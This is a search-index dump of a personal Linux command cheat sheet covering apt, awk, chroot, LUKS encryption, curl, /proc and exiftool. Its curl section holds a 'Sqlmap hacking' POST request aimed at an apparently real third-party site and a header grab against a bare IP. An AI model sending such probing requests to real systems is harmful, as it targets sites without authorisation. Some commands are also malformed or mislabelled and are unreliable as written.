/etc/bash_completion","title":"Enable programmable bash completion in debian lenny"},{"location":"linux/apt/#purge-configuration-files-of-removed-packages-on--debian-based-systems_1","text":"aptitude purge '~c'","title":"Purge configuration files of removed packages on  debian based systems"},{"location":"linux/apt/#list-total-available-upgrades-from--apt-without-upgrading-the-system","text":"apt-get -s upgrade | awk '/[0-9]+ upgraded,/ {print $1 \" package updates are available\"}'","title":"List total available upgrades from  apt without upgrading the system"},{"location":"linux/apt/#list-manually-installed-packages-excluding-essentials_1","text":"aptitude search '~i!~E' | grep -v \"i A\" | cut -d \" \" -f 4","title":"List manually installed packages (excluding Essentials)"},{"location":"linux/apt/#deploy-git-server-repo_1","text":"apt-get -y install git-core gitosis ; adduser home /home/git gecos \"git user\" git ; su git -c \"ssh-keygen -t rsa -f /home/git/.ssh/id_rsa; gitosis-init < ~/.ssh/id_rsa\"","title":"Deploy git server repo"},{"location":"linux/apt/#remove-all-unused-kernels-with-apt","text":"```sh aptitude remove ?and(~i~nlinux-(im|he) ?not(~n`uname -r`))","title":"Remove all unused kernels with apt"},{"location":"linux/apt/#cancel-all-sh_1","text":"aptitude scheduled actions ```sh aptitude keep-all","title":"Cancel all ```sh"},{"location":"linux/apt/#shows-all-packages-installed-that-are-recommended-by-other-packages_1","text":"aptitude search '?and( ?automatic(?reverse-recommends(?installed)), ?not(?automatic(?reverse-depends(?installed))) )'","title":"Shows all packages installed that are recommended by other packages"},{"location":"linux/apt/#remove-specific-versions-of-old-kernels-ubuntudebian_1","text":"apt purge linux* { 14 ..18 } *","title":"Remove specific versions of old kernels (Ubuntu/Debian)"},{"location":"linux/apt/#list-available-upgrades-from-","text":"``sh apt (package names only) ### print the name of each package APT knows [matching a prefix] ```sh apt-cache pkgnames linux-","title":"List available upgrades from `"},{"location":"linux/apt/#locating-packages-held-back-such-as-with-aptitude-hold-","text":"aptitude search ~ahold","title":"Locating packages held back, such as with \"aptitude hold \""},{"location":"linux/apt/#aptitude-pattern-match_1","text":"aptitude purge remove ~i^foo ~i^bar","title":"Aptitude pattern match"},{"location":"linux/apt/#list-upgrade-able-packages-on-ubuntu_1","text":"apt-get ignore-hold allow-unauthenticated -s dist-upgrade | grep ^Inst | cut -d ' ' -f2","title":"List upgrade-able packages on Ubuntu"},{"location":"linux/apt/#clone-a-list-of-installed-packages-from-one-debianubuntu-server-to-another_1","text":"apt-get install ` ssh root@host_you_want_to_clone \"dpkg -l | grep ii\" | awk '{print $2}' `","title":"\"Clone\" a list of installed packages from one Debian/Ubuntu Server to another"},{"location":"linux/apt/#purge-configuration-file-of-all-desinstalled-package_2","text":"aptitude purge ~c","title":"Purge configuration file of all desinstalled package"},{"location":"linux/apt/#purge-configuration-file-of-all-desinstalled-package_3","text":"aptitude purge ~c","title":"Purge configuration file of all desinstalled package"},{"location":"linux/apt/#list-available-upgrades-from-sh","text":"apt without upgrading the system ```sh apt list upgradable","title":"List available upgrades from ```sh"},{"location":"linux/apt/#generate-a-list-of-installed-packages-on-debian-based-systems_1","text":"aptitude search ~i -F %p","title":"Generate a list of installed packages on Debian-based systems"},{"location":"linux/apt/#allinone-package-maintainance_1","text":"apt-get update && apt-get dist-upgrade -y show-progress && apt-get autoremove -y && apt-get check && apt-get autoclean -y","title":"AllInOne package maintainance"},{"location":"linux/apt/#search-package-descriptions-apt","text":"apt-cache search someregex","title":"search package descriptions (apt)"},{"location":"linux/apt/#removes-all-packages-recommended-by-other-packages_1","text":"aptitude remove '?and( ?automatic(?reverse-recommends(?installed)), ?not(?automatic(?reverse-depends(?installed))) )'","title":"Removes all packages recommended by other packages"},{"location":"linux/apt/#seach-for-packages-on-debian-using-regex_1","text":"aptitude search ^tin","title":"Seach for packages on Debian using regex."},{"location":"linux/apt/#remove-unused-libspackages_1","text":"aptitude remove $( deborphan )","title":"Remove unused libs/packages"},{"location":"linux/apt/#install-evertything-with-the-prefix-pidgin-or-wathever_1","text":"apt-cache search pidgin* | awk '{print$ 1}' | tr '\\n' ' ' | xargs aptitude -y install","title":"Install evertything with the prefix pidgin or wathever"},{"location":"linux/apt/#install-phpmyadmin-in-debian-6_1","text":"apt-get install phpmyadmin ; echo \"Include /etc/phpmyadmin/apache.conf\" >> /etc/apache2/apache2.conf ; service apache2 restart","title":"Install phpmyadmin in Debian 6"},{"location":"linux/apt/#repository-search_1","text":"aptitude search ~d \"irc client\" | grep -i \"irc client\"","title":"repository search"},{"location":"linux/apt/#show-a-package-version-on-debian-based-distribution_4","text":"aptitude -F '%p %v#' search <pattern>","title":"Show a Package Version on Debian based distribution"},{"location":"linux/apt/#quick-and-dirty-list-of-installed-packages-on-deb-based-system_1","text":"apt-cache -n dumpavail | grep 'Package:' | awk '{print $2 }'","title":"Quick and dirty list of installed packages on deb based system"},{"location":"linux/apt/#atualizar-ubuntu_1","text":"apt-get update -y && apt-get upgrade -y && apt-get dist-upgrade -y && apt-get autoremove -y && apt-get autoclean -y","title":"Atualizar Ubuntu"},{"location":"linux/apt/#check-the-package-is-installed-or-not-there-will-show-the-package-name-which-is-installed_1","text":"apt-show-versions | grep '\\bpython\\b'","title":"Check the package is installed or not. There will show the package name which is installed."},{"location":"linux/apt/#marks-all-manually-installed-deb-packages-as-automatically-installed_1","text":"aptitude -F \"%p\" search \\! ~M~i~T | xargs apt-mark markauto","title":"Marks all manually installed deb packages as automatically installed."},{"location":"linux/apt/#print-sorted-list-of-all-installed-packages-debian_1","text":"aptitude search -F \"%p\" disable-columns ~i","title":"Print sorted list of all installed packages (Debian)"},{"location":"linux/awk/","text":"awk AWK/Nawk/Gawk AWK - the (very old) *original* from `AT&T` NAWK - A newer, improved version from `AT&T` GAWK - The Free Software foundation's version Add a blank line after every 5 th line seq 10 | awk '{ print; } NR % 5 == 0 { print \"\"; }' 1 2 3 4 5 6 7 8 9 10 Insert a empty line after every 3 words awk 'BEGIN{ORS=\"\\n\\n\\n\"};1' Uppercasing First Letter of Words Using AWK echo wuseman | awk '{for(i=1;i<=NF;i++){ $i=toupper(substr($i,1,1)) substr($i,2) }}1' Make a jump after every second string awk ' { cur = substr ( $0 ,1,1 ) } NR > 1 && cur ! = prev { print \"\" } { prev = cur ; print } Live editor: https://awk.js.org/ Good Resources https://www.grymoire.com/Unix/Awk.html https://www.gnu.org/software/gawk/manual/gawk.html https://backreference.org/2014/01/22/pulling-out-strings/index.html https://learnbyexample.github.io/learn_gnuawk/record-separators.html","title":"awk"},{"location":"linux/awk/#awk","text":"","title":"awk"},{"location":"linux/awk/#awknawkgawk","text":"AWK - the (very old) *original* from `AT&T` NAWK - A newer, improved version from `AT&T` GAWK - The Free Software foundation's version","title":"AWK/Nawk/Gawk"},{"location":"linux/awk/#add-a-blank-line-after-every-5th-line","text":"seq 10 | awk '{ print; } NR % 5 == 0 { print \"\"; }' 1 2 3 4 5 6 7 8 9 10","title":"Add a blank line after every 5th line"},{"location":"linux/awk/#insert-a-empty-line-after-every-3-words","text":"awk 'BEGIN{ORS=\"\\n\\n\\n\"};1'","title":"Insert a empty line after every 3 words"},{"location":"linux/awk/#uppercasing-first-letter-of-words-using-awk","text":"echo wuseman | awk '{for(i=1;i<=NF;i++){ $i=toupper(substr($i,1,1)) substr($i,2) }}1'","title":"Uppercasing First Letter of Words Using AWK"},{"location":"linux/awk/#make-a-jump-after-every-second-string","text":"awk ' { cur = substr ( $0 ,1,1 ) } NR > 1 && cur ! = prev { print \"\" } { prev = cur ; print }","title":"Make a jump after every second string"},{"location":"linux/awk/#live-editor","text":"https://awk.js.org/","title":"Live editor:"},{"location":"linux/awk/#good-resources","text":"https://www.grymoire.com/Unix/Awk.html https://www.gnu.org/software/gawk/manual/gawk.html https://backreference.org/2014/01/22/pulling-out-strings/index.html https://learnbyexample.github.io/learn_gnuawk/record-separators.html","title":"Good Resources"},{"location":"linux/chroot/","text":"chroot Important Remember that if you subsequently use the target machine directly at its keyboard (rather than through the ssh/screen combination as here), you'll be working outside of the chroot, and all your paths will be incorrect (e.g. the new system will still appear at /mnt/gentoo/). It's an easy mistake to make, hence the renaming of the prompts. Once the kernel is built and the machine rebooted, we'll be 'natively' inside the new system, at which point this path issue will disappear. #!/bin/bash mount --types proc /proc /mnt/gentoo/proc mount --rbind /sys /mnt/gentoo/sys mount --make-rslave /mnt/gentoo/sys mount --rbind /dev /mnt/gentoo/dev mount --make-rslave /mnt/gentoo/dev mount --bind /run /mnt/gentoo/run mount --make-slave /mnt/gentoo/run chroot /mnt/gentoo /bin/bash source /etc/profile export PS1 = \"(chroot) $PS1 \"","title":"chroot"},{"location":"linux/chroot/#chroot","text":"Important Remember that if you subsequently use the target machine directly at its keyboard (rather than through the ssh/screen combination as here), you'll be working outside of the chroot, and all your paths will be incorrect (e.g. the new system will still appear at /mnt/gentoo/). It's an easy mistake to make, hence the renaming of the prompts. Once the kernel is built and the machine rebooted, we'll be 'natively' inside the new system, at which point this path issue will disappear. #!/bin/bash mount --types proc /proc /mnt/gentoo/proc mount --rbind /sys /mnt/gentoo/sys mount --make-rslave /mnt/gentoo/sys mount --rbind /dev /mnt/gentoo/dev mount --make-rslave /mnt/gentoo/dev mount --bind /run /mnt/gentoo/run mount --make-slave /mnt/gentoo/run chroot /mnt/gentoo /bin/bash source /etc/profile export PS1 = \"(chroot) $PS1 \"","title":"chroot"},{"location":"linux/cryptsetup/","text":"mkfs/cryptsetup/luks/lvm Encrypt, format, overwrite, zeroing and alot more for secure your system / drives I will use DRIVE=\" \" fyi, change to your disk before you using any of the below commands, they are very powerful and will break your system if you doing it wrong! Be careful DISK is entire HDD andm 1 , 2 and 3 is partition in this wiki 1 = `Grub` 2 = `Boot/Esp` 3 = `Root` K = `KeyFile` U = `USB Drive For Keep Our KEY!` H = `Header Backup` E = `External Encrypted Drive` Variables DISKU = \"/dev/sda\" DISKE = \"/dev/sdb\" DISK1 = \"/dev/nvme0n1\" DISK1_1 = \"/dev/nvme0n1p3p1\" DISK1_2 = \"/dev/nvme0n1p3p2\" DISK1_3 = \"/dev/nvme0n1p3p3\" DISK1_K = \" $( hostname ) \" DISK1_H = \" $( hostname ) _header_backup\" Generate 4096-bit random key file dd if = /dev/urandom of = ${ DISK1_K } bs = 8M count = 1 Add a key file to next free key slot. This will prompt for a passphrase. You can have up to 8 slots. cryptsetup luksAddKey /dev/ ${ DISK1 } ${ DISK1_K } Add a key file to specific key slot, e.g slot 2 cryptsetup luksAddKey --key-slot 7 /dev/ ${ DISK1_3 } ${ DISK1_K } .key View key Slots (use | grep Slot if needed )\" cryptsetup luksDump ${ DISK1_3 } Remove key from key slot. Enter pasphrase or specify key file to remove. The slot will automatically be detected and slot key removed. cryptsetup luksRemoveKey ${ DISK1_3 } cryptsetup luksRemoveKey ${ DISK1_3 } ${ DISK1_K } .key Add password to a luks volume when we only have a keyfile cryptsetup -d ${ DISK1_K } .key luksAddKey ${ DISK1_3 } Create header backup cryptsetup luksHeaderBackup ${ DISK1_3 } --header-backup-file ${ DISK1_H } .img Encrypt Dr\u00edve cryptsetup -d ${ DISK1_K } .key --key-description kiss_my_fucking_ass --cipher twofish-xts-plain64 --hash sha512 --iter-time 5000 --use-urandom luksFormat ${ DISK1 } Decrypt and luksOpen our Drive With keyFile cryptsetup -d ${ DISK1_K } .key luksOpen /dev/sdc usb View status of the map cryptsetup -v status /dev/mapper/rootfs ' Zero the partition prior to formatting dd if = /dev/zero of = /dev/mapper/ ${ DISK1_VGName } status = progress Urandomize the partition prior to formatting dd if = /dev/urandom of = /dev/mapper/ ${ DISK1_VGName } status = progress Format LUKS and use ext4 filesystem mkfs.ext4 /dev/mapper/ ${ DISK1_VGName } Decrypt and Mount cryptsetup luksOpen ${ DISK1_3 } <choosen_name> mount /dev/mapper/ ${ DISK1_3 } /mnt/<choosen_name> Close and Unmount the LUKS partition cryptsetup luksClose /dev/mapper/ ${ DISK1_VGname }","title":"cryptsetup"},{"location":"linux/cryptsetup/#mkfscryptsetuplukslvm","text":"Encrypt, format, overwrite, zeroing and alot more for secure your system / drives I will use DRIVE=\" \" fyi, change to your disk before you using any of the below commands, they are very powerful and will break your system if you doing it wrong! Be careful","title":"mkfs/cryptsetup/luks/lvm"},{"location":"linux/cryptsetup/#disk-is-entire-hdd-andm-12-and-3-is-partition-in-this-wiki","text":"1 = `Grub` 2 = `Boot/Esp` 3 = `Root` K = `KeyFile` U = `USB Drive For Keep Our KEY!` H = `Header Backup` E = `External Encrypted Drive` Variables DISKU = \"/dev/sda\" DISKE = \"/dev/sdb\" DISK1 = \"/dev/nvme0n1\" DISK1_1 = \"/dev/nvme0n1p3p1\" DISK1_2 = \"/dev/nvme0n1p3p2\" DISK1_3 = \"/dev/nvme0n1p3p3\" DISK1_K = \" $( hostname ) \" DISK1_H = \" $( hostname ) _header_backup\"","title":"DISK is entire HDD andm 1,2 and 3 is partition in this wiki"},{"location":"linux/cryptsetup/#generate-4096-bit-random-key-file","text":"dd if = /dev/urandom of = ${ DISK1_K } bs = 8M count = 1","title":"Generate 4096-bit random key file"},{"location":"linux/cryptsetup/#add-a-key-file-to-next-free-key-slot-this-will-prompt-for-a-passphrase","text":"You can have up to 8 slots. cryptsetup luksAddKey /dev/ ${ DISK1 } ${ DISK1_K }","title":"Add a key file to next free key slot. This will prompt for a passphrase."},{"location":"linux/cryptsetup/#add-a-key-file-to-specific-key-slot-eg-slot-2","text":"cryptsetup luksAddKey --key-slot 7 /dev/ ${ DISK1_3 } ${ DISK1_K } .key","title":"Add a key file to specific key slot, e.g slot 2"},{"location":"linux/cryptsetup/#view-key-slots","text":"(use | grep Slot if needed )\" cryptsetup luksDump ${ DISK1_3 }","title":"View key Slots"},{"location":"linux/cryptsetup/#remove-key-from-key-slot-enter-pasphrase-or-specify-key-file-to-remove","text":"The slot will automatically be detected and slot key removed. cryptsetup luksRemoveKey ${ DISK1_3 } cryptsetup luksRemoveKey ${ DISK1_3 } ${ DISK1_K } .key","title":"Remove key from key slot. Enter pasphrase or specify key file to remove."},{"location":"linux/cryptsetup/#add-password-to-a-luks-volume-when-we-only-have-a-keyfile","text":"cryptsetup -d ${ DISK1_K } .key luksAddKey ${ DISK1_3 }","title":"Add password to a luks volume when we only have a keyfile"},{"location":"linux/cryptsetup/#create-header-backup","text":"cryptsetup luksHeaderBackup ${ DISK1_3 } --header-backup-file ${ DISK1_H } .img","title":"Create header backup"},{"location":"linux/cryptsetup/#encrypt-dr\u00edve","text":"cryptsetup -d ${ DISK1_K } .key --key-description kiss_my_fucking_ass --cipher twofish-xts-plain64 --hash sha512 --iter-time 5000 --use-urandom luksFormat ${ DISK1 }","title":"Encrypt Dr\u00edve"},{"location":"linux/cryptsetup/#decrypt-and-luksopen-our-drive-with-keyfile","text":"cryptsetup -d ${ DISK1_K } .key luksOpen /dev/sdc usb","title":"Decrypt and luksOpen our Drive With keyFile"},{"location":"linux/cryptsetup/#view-status-of-the-map","text":"cryptsetup -v status /dev/mapper/rootfs '","title":"View status of the map"},{"location":"linux/cryptsetup/#zero-the-partition-prior-to-formatting","text":"dd if = /dev/zero of = /dev/mapper/ ${ DISK1_VGName } status = progress","title":"Zero the partition prior to formatting"},{"location":"linux/cryptsetup/#urandomize-the-partition-prior-to-formatting","text":"dd if = /dev/urandom of = /dev/mapper/ ${ DISK1_VGName } status = progress","title":"Urandomize the partition prior to formatting"},{"location":"linux/cryptsetup/#format-luks-and-use-ext4-filesystem","text":"mkfs.ext4 /dev/mapper/ ${ DISK1_VGName }","title":"Format LUKS and use ext4 filesystem"},{"location":"linux/cryptsetup/#decrypt-and-mount","text":"cryptsetup luksOpen ${ DISK1_3 } <choosen_name> mount /dev/mapper/ ${ DISK1_3 } /mnt/<choosen_name>","title":"Decrypt and Mount"},{"location":"linux/cryptsetup/#close-and-unmount-the-luks-partition","text":"cryptsetup luksClose /dev/mapper/ ${ DISK1_VGname }","title":"Close and Unmount the LUKS partition"},{"location":"linux/curl/","text":"curl Dump header to file curl -sL --dump-header cookie.txt http://192.168.32.1 Store and save cookies curl -b cookie.txt -c cookie.txt http://192.168.32.1/index.html Method 2: Store and save cookies curl --cookie cookie.txt --cookie-jar cookie.txt http://192.168.32.1/index.html will both store and send saved cookies Method 3: Use STDOUT/STDIN for login write to STDOUT and save into $cookie variable read cookie from $cookie variable cookie=$(curl -c - 192.168.32.1) curl --cookie <(echo \"$cookie\") http://192.168.32.1/index.html Add a Cookie curl -b 'session=<token>' https://google.com Add Two Cookies curl -b 'session=<token>' -b 'loggedin=true' https://google.com Add an Empty Cookie curl -b 'session=' https://google.com Save Cookies to a File curl -c cookies.txt https://www.google.com Load Cookies from a File curl -b cookies.txt https://www.google.com Use curl behind socks5 proxy curl --socks5-hostname localhost:8001 http://www.google.com/ Tor, for Windows curl --socks5-hostname localhost:9150 https://check.torproject.org Progress bar curl --silent ftp://ftp.example.com/file.zip Save to a file curl -o filename foo.com/filename Show headers curl ${url} -I -o headers -s Print all repos from a user curl -s https://api.github.com/users/user/repos?per_page=1000\\ |grep git_url\\ |awk '{print $2}'\\ |sed 's/\"\\(.*\\)\",/\\1/' Print WAN IP curl ifconfig.me Print WAN IP curl -s http://checkip.dyndns.org/ | grep -o \"[[:digit:].]\\+\" Print info about WAN ip curl ipinfo.io Check weather curl wttr.in/sydney See where a shortened url takes you before click curl -sI url | sed -n 's/Location: *//p' Send email with curl and gmail curl -n --ssl-reqd --mail-from \"<user@gmail.com>\" \\ --mail-rcpt \"<user@server.tld>\" --url smtps://smtp.gmail.com:465 -T file.txt Read Email curl -u username:password imap://mail.example.com List all mailboxes and NOT view any specific message curl -u \"username:password\" imap://mail.example.com \\ -X 'UID FETCH 1234' Send an http HEAD request w/curl curl -I http://localhost Extract tarball from internet without local saving curl http://example.com/a.gz | tar xz List all repos from wuseman curl --silent https://api.github.com/repos/wuseman/ List info from a repo curl --silent \"https://api.github.com/repos/wuseman/emagnet\" List info about a user curl -Ls https://api.github.com/users/wuseman List a users gists curl -Ls https://api.github.com/users/wuseman/gists Print Geo info (geoipupdate.sh must be runned before) curl ipinfo.io/23.66.166.151 Pentration testing curl -s -D http://167.71.67.124/ -o /dev/null | grep -i Server\\|X-Powered-By Sqlmap hacking curl -k -i --raw -X POST -d \"action=saveadwords&delconf=1&oId[]=1\" https://uuruu.ru This is better than -I for header curl -s -D - -o /dev/null http://example.com Heaer output curl -L -v -s -o /dev/null google.de Print info about Moon curl wttr.in/Moon Extract url curl --head --silent --write-out \"%{redirect_url}\\n\" \\ --output /dev/null https://git.io/Ju8HK Save file download to another nanme curl -o magazine.pdf -C - https://uuruu.ru/foo.pd Check response time to a website curl -s -w 'Http code: %{http_code}\\nTotal time:%{time_total}s\\n' -o /dev/null https://uuruu.ru Http code: 200 Total time:0.106495s Just basic documentio curl -w \"%{time_total}\\n\" -o /dev/null -s www.example.com Read your incoming EMAIL curl -u username:password --silent \"https://mail.google.com/mail/feed/atom\" | tr -d ' ' | awk -F '' '{for (i=2; i<=NF; i++) {print $i}}' | sed -n \"s/' Pastebins Upload stdout to clbin echo hi| curl -F 'clbin=<-' https://clbin.com It also supports image uploads (PNG, JPG, and GIF): curl -F 'clbin=@image.png' https://clbin.com If you want to use Sprunge.us instead, type: cat textfile.txt | curl -F 'sprunge=<-' http://sprunge.us Upload on IX.io curl -F 'f:1=@file.txt' ix.io cat file.txt | curl -F 'f:1=<-' ix.io Parallel Visit google five times in one command, various methods below: seq 1 5 | xargs -n1 -P 5 curl -I \"https://www.google.com\" xargs -I % -P 5 curl \"https://www.google.com\" \\ < <(printf '%s\\n' {1..5}) echo \"https://www.google.com https://www.facebook.com https://www.yahoo.com\" | xargs -P 5 -n 1 curl -I xargs -P 5 -n 1 curl -O < list.txt Good References https://fedingo.com/how-to-run-multiple-curl-requests-in-parallel/","title":"curl"},{"location":"linux/curl/#curl","text":"","title":"curl"},{"location":"linux/curl/#dump-header-to-file","text":"curl -sL --dump-header cookie.txt http://192.168.32.1","title":"Dump header to file"},{"location":"linux/curl/#store-and-save-cookies","text":"curl -b cookie.txt -c cookie.txt http://192.168.32.1/index.html","title":"Store and save cookies"},{"location":"linux/curl/#method-2-store-and-save-cookies","text":"curl --cookie cookie.txt --cookie-jar cookie.txt http://192.168.32.1/index.html will both store and send saved cookies","title":"Method 2: Store and save cookies"},{"location":"linux/curl/#method-3-use-stdoutstdin-for-login","text":"write to STDOUT and save into $cookie variable read cookie from $cookie variable cookie=$(curl -c - 192.168.32.1) curl --cookie <(echo \"$cookie\") http://192.168.32.1/index.html","title":"Method 3: Use STDOUT/STDIN for login"},{"location":"linux/curl/#add-a-cookie","text":"curl -b 'session=<token>' https://google.com","title":"Add a Cookie"},{"location":"linux/curl/#add-two-cookies","text":"curl -b 'session=<token>' -b 'loggedin=true' https://google.com","title":"Add Two Cookies"},{"location":"linux/curl/#add-an-empty-cookie","text":"curl -b 'session=' https://google.com","title":"Add an Empty Cookie"},{"location":"linux/curl/#save-cookies-to-a-file","text":"curl -c cookies.txt https://www.google.com","title":"Save Cookies to a File"},{"location":"linux/curl/#load-cookies-from-a-file","text":"curl -b cookies.txt https://www.google.com","title":"Load Cookies from a File"},{"location":"linux/curl/#use-curl-behind-socks5-proxy","text":"curl --socks5-hostname localhost:8001 http://www.google.com/","title":"Use curl behind socks5 proxy"},{"location":"linux/curl/#tor-for-windows","text":"curl --socks5-hostname localhost:9150 https://check.torproject.org","title":"Tor, for Windows"},{"location":"linux/curl/#progress-bar","text":"curl --silent ftp://ftp.example.com/file.zip","title":"Progress bar"},{"location":"linux/curl/#save-to-a-file","text":"curl -o filename foo.com/filename","title":"Save to a file"},{"location":"linux/curl/#show-headers","text":"curl ${url} -I -o headers -s","title":"Show headers"},{"location":"linux/curl/#print-all-repos-from-a-user","text":"curl -s https://api.github.com/users/user/repos?per_page=1000\\ |grep git_url\\ |awk '{print $2}'\\ |sed 's/\"\\(.*\\)\",/\\1/'","title":"Print all repos from a user"},{"location":"linux/curl/#print-wan-ip","text":"curl ifconfig.me","title":"Print WAN IP"},{"location":"linux/curl/#print-wan-ip_1","text":"curl -s http://checkip.dyndns.org/ | grep -o \"[[:digit:].]\\+\"","title":"Print WAN IP"},{"location":"linux/curl/#print-info-about-wan-ip","text":"curl ipinfo.io","title":"Print info about WAN ip"},{"location":"linux/curl/#check-weather","text":"curl wttr.in/sydney","title":"Check weather"},{"location":"linux/curl/#see-where-a-shortened-url-takes-you-before-click","text":"curl -sI url | sed -n 's/Location: *//p'","title":"See where a shortened url takes you before click"},{"location":"linux/curl/#send-email-with-curl-and-gmail","text":"curl -n --ssl-reqd --mail-from \"<user@gmail.com>\" \\ --mail-rcpt \"<user@server.tld>\" --url smtps://smtp.gmail.com:465 -T file.txt","title":"Send email with curl and gmail"},{"location":"linux/curl/#read-email","text":"curl -u username:password imap://mail.example.com","title":"Read Email"},{"location":"linux/curl/#list-all-mailboxes-and-not-view-any-specific-message","text":"curl -u \"username:password\" imap://mail.example.com \\ -X 'UID FETCH 1234'","title":"List all mailboxes and NOT view any specific message"},{"location":"linux/curl/#send-an-http-head-request-wcurl","text":"curl -I http://localhost","title":"Send an http HEAD request w/curl"},{"location":"linux/curl/#extract-tarball-from-internet-without-local-saving","text":"curl http://example.com/a.gz | tar xz","title":"Extract tarball from internet without local saving"},{"location":"linux/curl/#list-all-repos-from-wuseman","text":"curl --silent https://api.github.com/repos/wuseman/","title":"List all repos from wuseman"},{"location":"linux/curl/#list-info-from-a-repo","text":"curl --silent \"https://api.github.com/repos/wuseman/emagnet\"","title":"List info from a repo"},{"location":"linux/curl/#list-info-about-a-user","text":"curl -Ls https://api.github.com/users/wuseman","title":"List info about a user"},{"location":"linux/curl/#list-a-users-gists","text":"curl -Ls https://api.github.com/users/wuseman/gists","title":"List a users gists"},{"location":"linux/curl/#print-geo-info-geoipupdatesh-must-be-runned-before","text":"curl ipinfo.io/23.66.166.151","title":"Print Geo info (geoipupdate.sh must be runned before)"},{"location":"linux/curl/#pentration-testing","text":"curl -s -D http://167.71.67.124/ -o /dev/null | grep -i Server\\|X-Powered-By","title":"Pentration testing"},{"location":"linux/curl/#sqlmap-hacking","text":"curl -k -i --raw -X POST -d \"action=saveadwords&delconf=1&oId[]=1\" https://uuruu.ru","title":"Sqlmap hacking"},{"location":"linux/curl/#this-is-better-than--i-for-header","text":"curl -s -D - -o /dev/null http://example.com","title":"This is better than -I for header"},{"location":"linux/curl/#heaer-output","text":"curl -L -v -s -o /dev/null google.de","title":"Heaer output"},{"location":"linux/curl/#print-info-about-moon","text":"curl wttr.in/Moon","title":"Print info about Moon"},{"location":"linux/curl/#extract-url","text":"curl --head --silent --write-out \"%{redirect_url}\\n\" \\ --output /dev/null https://git.io/Ju8HK","title":"Extract url"},{"location":"linux/curl/#save-file-download-to-another-nanme","text":"curl -o magazine.pdf -C - https://uuruu.ru/foo.pd","title":"Save file download to another nanme"},{"location":"linux/curl/#check-response-time-to-a-website","text":"curl -s -w 'Http code: %{http_code}\\nTotal time:%{time_total}s\\n' -o /dev/null https://uuruu.ru Http code: 200 Total time:0.106495s","title":"Check response time to a website"},{"location":"linux/curl/#just-basic-documentio","text":"curl -w \"%{time_total}\\n\" -o /dev/null -s www.example.com","title":"Just basic documentio"},{"location":"linux/curl/#read--your-incoming-email","text":"curl -u username:password --silent \"https://mail.google.com/mail/feed/atom\" | tr -d ' ' | awk -F '' '{for (i=2; i<=NF; i++) {print $i}}' | sed -n \"s/'","title":"Read  your incoming EMAIL"},{"location":"linux/curl/#pastebins","text":"","title":"Pastebins"},{"location":"linux/curl/#upload-stdout-to-clbin","text":"echo hi| curl -F 'clbin=<-' https://clbin.com","title":"Upload stdout to clbin"},{"location":"linux/curl/#it-also-supports-image-uploads-png-jpg-and-gif","text":"curl -F 'clbin=@image.png' https://clbin.com","title":"It also supports image uploads (PNG, JPG, and GIF):"},{"location":"linux/curl/#if-you-want-to-use-sprungeus-instead-type","text":"cat textfile.txt | curl -F 'sprunge=<-' http://sprunge.us","title":"If you want to use Sprunge.us instead, type:"},{"location":"linux/curl/#upload-on-ixio","text":"curl -F 'f:1=@file.txt' ix.io cat file.txt | curl -F 'f:1=<-' ix.io","title":"Upload on IX.io"},{"location":"linux/curl/#parallel","text":"","title":"Parallel"},{"location":"linux/curl/#visit-google-five-times-in-one-command-various-methods-below","text":"seq 1 5 | xargs -n1 -P 5 curl -I \"https://www.google.com\" xargs -I % -P 5 curl \"https://www.google.com\" \\ < <(printf '%s\\n' {1..5}) echo \"https://www.google.com https://www.facebook.com https://www.yahoo.com\" | xargs -P 5 -n 1 curl -I xargs -P 5 -n 1 curl -O < list.txt","title":"Visit google five times in one command, various methods below:"},{"location":"linux/curl/#good-references","text":"https://fedingo.com/how-to-run-multiple-curl-requests-in-parallel/","title":"Good References"},{"location":"linux/dev_and_proc/","text":"proc How I read,edit and handle everything in /proc will be added here Print syslog messages cat /proc/sys/kernel/printk Send Message to dmesg with the correct syntax for grabbing msg with syslog properly echo '<4>Foo: Message' | sudo tee /dev/kmsg","title":"dev and proc"},{"location":"linux/dev_and_proc/#proc","text":"How I read,edit and handle everything in /proc will be added here","title":"proc"},{"location":"linux/dev_and_proc/#print-syslog-messages","text":"cat /proc/sys/kernel/printk","title":"Print syslog messages"},{"location":"linux/dev_and_proc/#send-message-to-dmesg-with-the-correct-syntax-for-grabbing-msg-with-syslog-properly","text":"echo '<4>Foo: Message' | sudo tee /dev/kmsg","title":"Send Message to dmesg with the correct syntax for grabbing msg with syslog properly"},{"location":"linux/exiftool/","text":"exiftool How i edit, manipulates, injecting and writing and everything yuo can imagine about metadata will be found here with Phil Harvey's exiftool written in perl Replace existing keyword list with two new keywords (\"EXIF\" and \"editor\"). exiftool -keywords = EXIF -keywords = editor ${ FILENAME } .png Copy a source image to a new file, and add a keyword (\"word\") to the current list of keywords. exiftool -Keywords+ = word -o newfile.jpg ${ FILENAME } .png Delete Credit information from all files in a ${PATH}ectory where the Credit value was \"xxx\". exiftool -credit- = xxx ${ PATH } Write alternate language for XMP:Description, using HTML character escaping to input special characters. exiftool -xmp:description-de = 'k&uuml;hl' -E ${ FILENAME } .png Delete all meta information from an image. !!! Note: \"You should NOT do this to RAW images (except DNG) since proprietary RAW image formats often contain information in the makernotes that is necessary for converting the image\" exiftool -all = ${ FILENAME } .png Delete all meta information from an image and add a comment back in. Note that the order is important: -comment= lonely -all= would also delete the new comment. exiftool -all = -comment = 'lonely' ${ FILENAME } .png Delete all meta information except JFIF group from an image. exiftool -all = --jfif:all ${ FILENAME } .png Delete Photoshop meta information from an image (note that the Photoshop information also includes IPTC). exiftool -Photoshop:All = ${ FILENAME } .png Adjust original date/time of all images in directory \" ${PATH}\" by subtracting one hour and 30 minutes. This is equivalent to \"-DateTimeOriginal-=1.5\". See Image::ExifTool::Shift.pl for details. exiftool -DateTimeOriginal- = '0:0:0 1:30:0' ${ PATH } Add 3 hours to the CreateDate and ModifyDate timestamps of two images. exiftool -createdate+ = 3 -modifydate+ = 3 a.jpg b.jpg Shift the values of DateTimeOriginal, CreateDate and ModifyDate Forward by 1 hour and 30 minutes for all Canon images in a ${PATH}ectory. (The AllDates tag is provided as a shortcut for these three tags, allowing them to be accessed via a single tag.) exiftool -AllDates+ = 100000 :-30 -if '$make eq \"Canon\"' ${ PATH } Set all dates to 2012 exiftool -AllDates = \"2012:03:14 12:25:00\" Create xmp files exiftool -o %d%f.xmp ${ PATH } Set City exiftool -xmp:city = Kingston i Print Megapixels exiftool -Megapixels -if \" $Make eq 'Sony'\" Print GPS info exiftool -Composite:GPSPosition Remove all gps info exiftool -GPS* = -a remove ALL metadata run both exiftool -ApertureValue = \"3.0\" -EXIF:all = exiftool -EXIF:all = -ApertureValue = \"3.0\" Include some cool info $gpsPosition = $( exiftool -s -s -s 